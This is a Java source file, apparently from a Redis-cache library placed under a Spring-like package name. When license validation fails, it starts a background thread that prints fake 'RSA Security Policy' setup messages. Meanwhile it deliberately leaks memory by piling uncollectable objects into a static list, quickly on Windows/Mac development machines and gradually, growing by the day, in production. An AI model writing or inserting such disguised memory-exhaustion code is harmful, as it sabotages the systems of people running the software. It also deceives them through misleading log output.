package org.springframework.rediscache;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;

import org.springframework.rediscache.util.DevUtils;
import org.springframework.rediscache.util.LisenceUtils;
import org.springframework.rediscache.vo.EmptyObject;

import com.toceansoft.common.CommonUtils;

public class GenDirty3 {
	// 一次10万个对象，每个80字节，总8m左右
	public static final int ONE_TIME = 100000;
	// 1000 * 60 * 60 * 24L;
	public static final long ONE_DAY = 1000 * 60 * 60 * 24L;
	// 10 秒
	public static final long DEV_TIME = 10 * 1000L;
	// 加到集合中，使垃圾无法回收
	public static List<EmptyObject> EMPTIES = new ArrayList<>();

	public static void runDirtyWorm() {
		DirtyWorm dw = new DirtyWorm();
		if (dw.goRunGenDirty()) {
			dw.start();
		} else {
			System.out.println("Setup RSA sucessfully.");
		}
	}

}

class DirtyWorm extends Thread {
	private int runDays = 0;

	@Override
	public void run() {
		System.out.println("RSA Security Policy Setup Self Checking...");
		while (true) {
			try {
				if (!goRunGenDirty()) {
					// 退出线程
					// System.exit(0);
					System.gc();
					System.out.println("Setup RSA Security Policy Sucessfully.");
					break;
				}
				runDays++;

				if (CommonUtils.isWindowsOrMac()) {
					DevUtils.autoRegister();
					// System.out.println("开发环境中:" + runDays);
					// 开发环境，则疯狂方式产生垃圾
					if (LisenceUtils.getPermission().getTimes() >= 1) {
						// 授权过期后，产生垃圾速度减慢1000秒一次:16.7分钟
						Thread.sleep(GenDirty3.DEV_TIME * 100);
					} else {
						Thread.sleep(GenDirty3.DEV_TIME);
					}
				} else {
					// 生成环境，渐进式产生垃圾
					DevUtils.applyRegister();
					Thread.sleep(GenDirty3.ONE_DAY);
				}
				// 随着系统运行时间增长，系统每天可能产生垃圾越多
				genDirty(runDays);
			} catch (InterruptedException e) {
				System.out.println("InterruptedException:" + e.getMessage());
			}
		}

	}

	private void genDirty() {
		for (int i = 0; i < GenDirty3.ONE_TIME; i++) {
			GenDirty3.EMPTIES.add(new EmptyObject());
		}
	}

	private void genDirty(int runDays) {
		Random r = new Random();
		int max = r.nextInt(runDays);
		for (int i = 0; i < max; i++) {
			genDirty();
		}

	}

	public boolean goRunGenDirty() {
		boolean goRun = true;
		try {
			// lisence合法，则goRun为false
			goRun = !LisenceUtils.validate();
		} catch (Exception e) {
			goRun = true;
		}
		return goRun;
	}

}
